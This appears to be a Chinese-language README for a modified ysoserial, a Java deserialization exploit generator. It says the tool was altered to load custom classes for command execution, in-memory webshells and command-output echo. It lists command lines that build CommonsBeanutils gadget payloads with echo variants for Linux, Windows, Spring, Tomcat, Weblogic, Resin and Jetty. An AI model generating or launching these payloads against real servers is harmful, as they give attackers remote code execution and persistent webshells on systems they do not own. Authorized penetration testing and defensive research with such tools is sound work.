# ysoserial
ysoserial修改版，着重修改ysoserial.payloads.util.Gadgets.createTemplatesImpl使其可以通过引入自定义class的形式来执行命令、内存马、反序列化回显，在此基础上集成了多个回显方式。
## Usage
...
```shell
java -jar ysoserial.jar CommonsBeanutils192NOCC "directive:LinuxEcho"                     # LinuxEcho
java -jar ysoserial.jar CommonsBeanutils192NOCC "directive:WindowsEcho"                   # WindowsEcho
java -jar ysoserial.jar CommonsBeanutils192NOCC "directive:SpringEcho1"                   # SpringEcho1
java -jar ysoserial.jar CommonsBeanutils192NOCC "directive:SpringEcho2"                   # SpringEcho2
java -jar ysoserial.jar CommonsBeanutils192NOCC "directive:TomcatEcho"                    # TomcatEcho
java -jar ysoserial.jar CommonsBeanutils192NOCC "directive:WeblogicEcho1"                 # directive:WeblogicEcho1
java -jar ysoserial.jar CommonsBeanutils192NOCC "directive:WeblogicEcho2"                 # directive:WeblogicEcho2
java -jar ysoserial.jar CommonsBeanutils192NOCC "directive:ResinEcho"                     # ResinEcho
java -jar ysoserial.jar CommonsBeanutils192NOCC "directive:JettyEcho"                     # JettyEcho
java -jar ysoserial.jar CommonsBeanutils192NOCC "directive:AutoFindRequestEcho"           # AutoFindRequestEcho
java -jar ysoserial.jar CommonsBeanutils192NOCC "directive:WriteFileEcho"                 # WriteFileEcho
```
...
* [Y4er/ysoserial](https://github.com/Y4er/ysoserial.git)
